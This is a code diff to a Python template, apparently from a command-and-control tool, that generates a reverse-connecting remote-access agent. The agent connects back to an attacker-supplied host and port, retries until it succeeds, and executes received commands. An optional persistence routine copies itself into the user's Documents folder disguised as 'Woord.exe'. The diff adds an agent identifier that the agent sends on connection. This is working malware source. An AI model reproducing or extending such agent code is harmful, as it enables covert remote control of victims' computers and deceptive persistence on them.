@@ -1,5 +1,5 @@
 # templates/tcp_agent_template.py
-def tcp_agent_template(lhost, lport, persistence):
+def tcp_agent_template(lhost, lport, persistence,agent_id):
     if persistence==True:
         val2= """def ensure_persistence():
     destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "Woord.exe")
@@ -25,6 +25,7 @@ import sys
 import random
 import time
 
+agent_id='{agent_id}'
 ip = '{lhost}'
 port = {lport}
 current_working_directory = os.getcwd()
@@ -37,6 +38,7 @@ def attempt_connection():
             cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             cs.connect((ip, port))
             #print("Connected to server.")
+            cs.send(agent_id.encode())
             return cs
         except socket.error:
             #print("Connection failed, retrying in a few seconds...")
@@ -156,7 +158,7 @@ def execute_other_commands(client_socket, msg_parts):
 if __name__ == "__main__":
     {val}
     cs = attempt_connection()
-    cs.send(b'TEST CLIENT')
+    cs.send(agent_id.encode())
     process_commands(cs)
 
 """
